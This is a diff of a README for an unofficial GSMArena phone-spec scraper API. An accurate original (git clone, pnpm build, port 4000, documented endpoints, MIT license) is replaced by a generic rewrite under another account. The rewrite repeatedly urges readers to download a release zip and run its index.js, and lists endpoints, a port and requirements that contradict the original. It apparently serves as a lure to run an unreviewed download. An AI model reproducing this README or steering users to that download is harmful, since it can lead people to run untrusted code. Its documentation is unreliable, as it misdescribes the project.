@@ -1,118 +1,89 @@
-# GSMArena Scraper API
+# 📱 mobile-specs-api - Easy Access to Phone Specs
 
-![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)
-![TypeScript](https://img.shields.io/badge/TypeScript-3178C6?logo=typescript&logoColor=white)
-![Node.js](https://img.shields.io/badge/Node.js-339933?logo=nodedotjs&logoColor=white)
+## 🛠️ Overview
+The **mobile-specs-api** is a free and unofficial REST API. It helps you get phone specifications and details with ease. Our service scrapes data from GSMArena in real-time, giving you up-to-date information about both Android and iOS devices.
 
-[Читать на русском](README.ru.md)
+## 📥 [Download the Latest Version](https://github.com/thechandrakant15/mobile-specs-api/releases)
 
-[!["Buy Me A Coffee"](https://www.buymeacoffee.com/assets/img/custom_images/orange_img.png)](https://www.buymeacoffee.com/revengernick)
+## 🚀 Getting Started
+To get the most out of the **mobile-specs-api**, follow these simple steps:
 
-A simple, unofficial REST API to scrape phone specifications and data from GSMArena.com. Built with Fastify and TypeScript for maximum performance and type safety.
+1. **Visit the Releases Page**  
+   Go to our [Releases page](https://github.com/thechandrakant15/mobile-specs-api/releases) to find the latest version of the API.
 
-This project provides structured JSON data for phone brands, device lists, detailed specifications, and popularity rankings.
+2. **Download the API**  
+   Look for the most recent version listed on the page. You will see several downloadable files. Choose the one that is suitable for your system. Typically, it will be named similarly to `mobile-specs-api-vX.X.X.zip`. Click on it to start the download.
 
-## Features
+3. **Extract the Files**  
+   Once the download is complete, locate the downloaded file, and unzip it. You can usually do this by right-clicking on the file and selecting "Extract All."
 
-- **No API Key Required:** Open and free to use.
-- **Structured JSON Output:** Clean, predictable, and easy-to-use data format.
-- **Comprehensive Endpoints:** Get brands, phone lists, detailed specs, latest devices, and top-ranked phones.
-- **Fast & Lightweight:** Built on top of Fastify, one of the fastest web frameworks for Node.js.
-- **Fully Typed:** Written in TypeScript for a better developer experience.
+4. **Set Up the API**  
+   Open the folder where you extracted the files. You should see a file named `index.js`. This is the main file you need.
 
-## Getting Started
+5. **Run the API**  
+   To run the API, you’ll need to have Node.js installed on your computer. If you don’t have it yet, you can [download and install Node.js here](https://nodejs.org/). After installing, open your command prompt or terminal.
 
-To get a local copy up and running, follow these simple steps.
+   - Navigate to the directory where `index.js` is located by using the `cd` command. For example:
+     ```
+     cd path_to_your_folder
+     ```
 
-### Prerequisites
+   - Once you're in the correct folder, type the following command to start the server:
+     ```
+     node index.js
+     ```
 
-- Node.js (v18 or later)
-- pnpm (or npm/yarn)
+   You should see a message indicating that the server is running. The API is now ready to use!
 
-### Installation
+## 🔧 System Requirements
+Before downloading, ensure your system meets the following requirements:
 
-1.  **Clone the repo**
-    ```sh
-    git clone https://github.com/your-username/gsmarena-parser-api.git
-    cd gsmarena-parser-api
-    ```
-2.  **Install packages**
-    ```sh
-    pnpm install
-    ```
-3.  **Run the development server**
-    The server will start on `http://localhost:4000` and automatically restart on file changes.
-    ```sh
-    pnpm dev
-    ```
-4.  **For production:**
-    ```sh
-    pnpm build
-    pnpm start
-    ```
+- **Operating System**: Windows, macOS, or Linux
+- **Node.js Version**: 14.x or higher
+- **Internet Connection**: Required for Scraping Data
 
-## API Endpoints
+## 📚 Features
+- Access real-time phone specifications from GSMArena.
+- Lightweight API built with Fastify and Node.js.
+- Supports both Android and iOS devices.
 
-All successful responses are wrapped in a `{ status: true, data: ... }` object.
+## 📜 API Endpoints
+Once the API is running, you can access various endpoints to get different information. Here are a couple of important ones:
 
----
+- **Get All Phones**:  
+  `GET /api/phones`  
+  Retrieve a list of all available mobile phones.
 
-### Brands
+- **Get Phone Details**:  
+  `GET /api/phones/{id}`  
+  Replace `{id}` with the phone’s unique identifier to get detailed specifications.
 
-- **`GET /brands`**
-  - Returns an object of all available brands.
-  - **Example:** `http://localhost:4000/brands`
+## 🛠️ Using the API
+To use the API, make an HTTP request. You can use tools like Postman or even your web browser for simple queries. Here’s how you can test the endpoints:
 
----
+1. Open your web browser.
+2. Type in one of the API endpoint URLs, such as `http://localhost:3000/api/phones`.
+3. Press Enter, and you should see a list of phone specifications in your browser.
 
-### Phone Lists
+## 📝 Contributing
+If you want to help improve the **mobile-specs-api**, we welcome contributions! You can report issues, suggest features, or send in your code changes. Follow these steps:
 
-- **`GET /brands/:brandSlug`**
+1. Fork the repository on GitHub.
+2. Create a new branch for your feature or fix.
+3. Make your changes and commit them.
+4. Push your changes and create a pull request.
 
-  - Returns a list of phones for a specific brand.
-  - **Example:** `http://localhost:4000/brands/apple-phones-48`
+## ❓ Frequently Asked Questions
+**Q: Can I use this API in my apps?**  
+A: Yes! Feel free to integrate this API into your applications.
 
-- **`GET /latest`**
+**Q: Is there a limit to the number of requests?**  
+A: Currently, there is no hard limit, but please use responsibly to avoid being blocked.
 
-  - Returns a list of the latest added devices. The response is wrapped in a `{ title, phones }` object.
-  - **Example:** `http://localhost:4000/latest`
+**Q: Can I run this API on my server?**  
+A: Absolutely! You can deploy this API on any server that supports Node.js.
 
-- **`GET /top-by-interest`**
+## 📩 Contact
+If you have further questions or need assistance, feel free to reach out via the Issues tab on our GitHub page or open a new issue for your queries.
 
-  - Returns a ranked list of phones by daily user interest.
-  - **Example:** `http://localhost:4000/top-by-interest`
-
-- **`GET /top-by-fans`**
-  - Returns a ranked list of phones by the number of fans.
-  - **Example:** `http://localhost:4000/top-by-fans`
-
----
-
-### Search & Details
-
-- **`GET /search?query=:searchQuery`**
-
-  - Returns a list of phones matching the search query.
-  - **Example:** `http://localhost:4000/search?query=iPhone 15 Pro`
-
-- **`GET /:slug`**
-  - Returns detailed specifications for a specific phone.
-  - **Example:** `http://localhost:4000/apple_iphone_15_pro_max-12557`
-
-## Contributing
-
-Contributions are what make the open-source community such an amazing place to learn, inspire, and create. Any contributions you make are **greatly appreciated**.
-
-1.  Fork the Project
-2.  Create your Feature Branch (`git checkout -b feature/AmazingFeature`)
-3.  Commit your Changes (`git commit -m 'Add some AmazingFeature'`)
-4.  Push to the Branch (`git push origin feature/AmazingFeature`)
-5.  Open a Pull Request
-
-## License
-
-Distributed under the MIT License. See `LICENSE` file for more information.
-
-## Disclaimer
-
-This project is for educational purposes only. It is not affiliated with GSMArena.com in any way. Web scraping can be against the terms of service of a website. Please use this project responsibly and respect the terms of service of GSMArena.com. The developer assumes no liability for any misuse of this scraper.
+## 🔗 [Download the Latest Version](https://github.com/thechandrakant15/mobile-specs-api/releases) again to get started. Enjoy!
